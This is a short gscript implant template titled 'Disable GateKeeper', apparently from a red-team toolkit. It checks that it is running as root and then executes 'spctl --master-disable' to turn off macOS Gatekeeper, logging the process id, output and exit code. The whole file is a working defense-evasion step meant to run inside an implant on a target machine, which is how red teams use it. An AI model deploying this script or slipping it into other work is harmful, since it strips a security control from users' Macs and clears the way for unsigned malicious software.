// Example gscript template
// Title: Disable GateKeeper
// Author: ahhh
// Purpose: 
// Gscript version: 1.0.0
// ATT&CK: 
// Note: must run implant as root

//go_import:os/user as user

//priority:150
//timeout:150

function Deploy() {  
    console.log("starting execution of Disable GateKeeper");
    // Whoami
    var myuser = user.Current();
    console.log("Our user is: "+Dump(myuser[0]));
    if (myuser[0].Username == "root") {
        var response = G.exec.ExecuteCommand("spctl", ["--master-disable"]);
        console.log("Pid: "+response[0]);
        console.log("stdout: "+response[1]);
        console.log("stderr: "+response[2]);
        console.log("exit code: "+response[3]);
        console.log("go errors: "+response[4]);
        console.log("Done Disable GateKeeper");
    } else {
        console.log("Detected a non-root user, this needs to run as root!");
    } 
    return true;
}

